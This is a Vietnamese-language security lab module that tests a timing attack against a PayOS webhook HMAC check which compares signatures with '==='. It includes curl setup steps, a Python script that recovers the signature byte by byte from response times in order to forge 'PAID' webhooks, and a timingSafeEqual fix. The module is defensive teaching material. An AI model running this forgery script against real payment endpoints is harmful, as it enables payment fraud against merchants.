# M07 — Webhook HMAC Forgery (Timing Attack)

> Lỗ hổng lý thuyết: `lib/payments/payos.ts:192` so sánh signature bằng `===` (non-constant-time). Lab này kiểm tra xem có thể exploit trong thực tế qua mạng không.

## Mục tiêu

Forge một webhook PayOS hợp lệ **không cần biết `PAYOS_CHECKSUM_KEY`**, hoặc chứng minh không thể thực hiện qua mạng.

## Background

`verifyPayOSWebhookSignature`:
```ts
const expected = createHmac("sha256", checksumKey).update(rawBody).digest("hex");
return Boolean(signature) && signature === expected;
```

So sánh `===` dừng ở byte đầu tiên khác biệt → leak timing per-hex-char (~1 ns mỗi hex char). Qua mạng (RTT ~1 ms), nhiễu lớn hơn tín hiệu → không khai thác được. Nhưng trong lab (localhost, nhiều vòng lặp) có thể học bằng thống kê.

## Setup

1. Đảm bảo target đang chạy với `PAYOS_CHECKSUM_KEY=lab_checksum_key_32_char_long_here_xxxx`.
2. Trong attacker, cài Python + `requests`:
   ```bash
   pip3 install requests statistics
   ```

## Step 1 — Lấy 1 webhook hợp lệ (replay base)

Mock mode enabled trong lab. Tạo checkout order:

```bash
# Victim đăng nhập, lấy token
VICTIM_TOKEN="<access_token>"

# Tạo checkout mock
curl -X POST http://target:3000/api/billing/checkout \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan":"premium","gateway":"payos"}'
# → nhận orderCode, checkoutUrl
```

Mock callback tự grant premium. Webhook thật chưa có signature.

## Step 2 — Khảo sát timing

Tạo script `./lab/modules/07-hmac-timing/measure.py`:

```python
import requests
import time
import statistics
import hashlib

URL = "http://target:3000/api/billing/webhook"
RAW = b'{"data":{"orderCode":999999,"amount":99000,"status":"PAID"},"signature":"PLACEHOLDER"}'

def send(signature_hex: str, n=500):
    body = RAW.replace(b"PLACEHOLDER", signature_hex.encode())
    times = []
    for _ in range(n):
        t0 = time.perf_counter_ns()
        r = requests.post(URL, data=body, headers={"x-payos-signature": signature_hex})
        t1 = time.perf_counter_ns()
        times.append(t1 - t0)
    return statistics.median(times)

# Baseline: signature sai hoàn toàn
baseline = send("0" * 64)
print(f"baseline (all-zero): {baseline/1e6:.2f} ms")

# Test từng prefix: nếu timing tăng khi prefix đúng hơn khi sai
candidates = "0123456789abcdef"
known = ""
for pos in range(64):
    best = None
    best_t = 0
    for c in candidates:
        sig = known + c + "0" * (63 - len(known))
        t = send(sig, n=200)
        if best is None or t > best_t:
            best = c
            best_t = t
    known += best
    print(f"pos {pos}: chosen {best} (median {best_t/1e6:.2f} ms), known={known}")
    if len(known) == 64:
        print(f"Recovered signature: {known}")
        break
```

Chạy:

```bash
python3 measure.py 2>&1 | tee timing.log
```

## Step 3 — Phân tích

- Nếu timing cho mỗi position **không khác biệt vượt ngưỡng nhiễu mạng** (~ns vs ~ms) → **không khai thác được qua mạng**. Đây là kết quả kỳ vọng.
- Nếu có khác biệt rõ rệt → kỹ năng tinh chỉnh network (loại bỏ jitter qua trung bình) sẽ recover signature. Vẫn rất khó trong Docker local.

## Kết luận kỳ vọng

Verify cho dù dùng `===`, **timing attack qua mạng ở phiên bản SSH/HTTP là không khả thi** khi RTT >> per-char timing. **Tuy nhiên**, vẫn là best practice dùng `timingSafeEqual`:

```ts
import { timingSafeEqual } from "crypto";

export function verifyPayOSWebhookSignature(rawBody: string, signature: string | null) {
  if (!signature) return false;
  const expected = createHmac("sha256", getChecksumKey()).update(rawBody).digest("hex");
  const a = Buffer.from(signature, "hex");
  const b = Buffer.from(expected, "hex");
  return a.length === b.length && timingSafeEqual(a, b);
}
```

## Eratta

- Module này giả định có thể reach `/api/billing/webhook` từ attacker — lab cho phép (rate-limit webhook = 120/min). Nếu track module sẽ kỷ luật, mở route tạm thời.
- Đừng kết luận "an toàn vĩnh viễn" — hardware attacks (SGX side-channel, cache timing) có thể recover. Học cho defensive mindset.
